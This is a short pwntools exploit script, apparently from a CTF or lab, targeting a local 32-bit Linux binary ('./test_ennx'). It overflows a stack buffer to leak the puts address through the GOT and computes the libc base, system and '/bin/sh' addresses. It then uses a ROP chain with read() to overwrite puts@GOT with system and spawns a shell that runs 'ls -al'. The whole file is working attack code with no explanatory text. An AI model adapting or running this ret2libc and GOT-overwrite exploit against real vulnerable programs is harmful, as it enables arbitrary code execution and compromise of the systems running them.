from pwn import *
context(arch = 'i386', os = 'linux', log_level='debug')
p = process("./test_ennx")
puts_plt = 0x8048398
main = 0x80484b5
puts_got = p.elf.got['puts']
print "puts got " +  hex(puts_got)
print p.recvline()
payload = 'A'* 28 +  p32(puts_plt) + p32(main) + p32(puts_got)
p.sendline(payload)
print p.recvline()
data = ''
c = p.recv(4)
if c[-1] == '\n' or c[-1] == "":  
	data = c[0:3]
	data += "\x00"
else:
	data = c
print p.recvline()
log.info("=> %s" % (data or '').encode('hex'))
puts_addr = int(data.encode('hex'), 16)
puts_addr = struct.pack("<I", puts_addr)
puts_addr = int(puts_addr.encode("hex"), 16)
libc_base = puts_addr - 0x62aa0
system_addr = libc_base + 0x3af00
binsh_addr = libc_base + 0x156b65
read_addr = libc_base + 0xd2c30
rop_chain = 0x08048576 #pop esi ; pop edi ; pop ebp ; ret;
print "libc base %x, system addr %x, binsh addr %x, read addr %x" %(libc_base, system_addr, binsh_addr, read_addr)
print "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
payload = "A" *20 + p32(read_addr) + p32(rop_chain) + p32(0) + p32(puts_got) + p32(4) + p32(puts_plt) + p32(0) + p32(binsh_addr)
p.sendline(payload)
p.recvline()
p.send(p32(system_addr))
p.sendline("ls -al")
p.recvuntil("sp00f")
p.close()




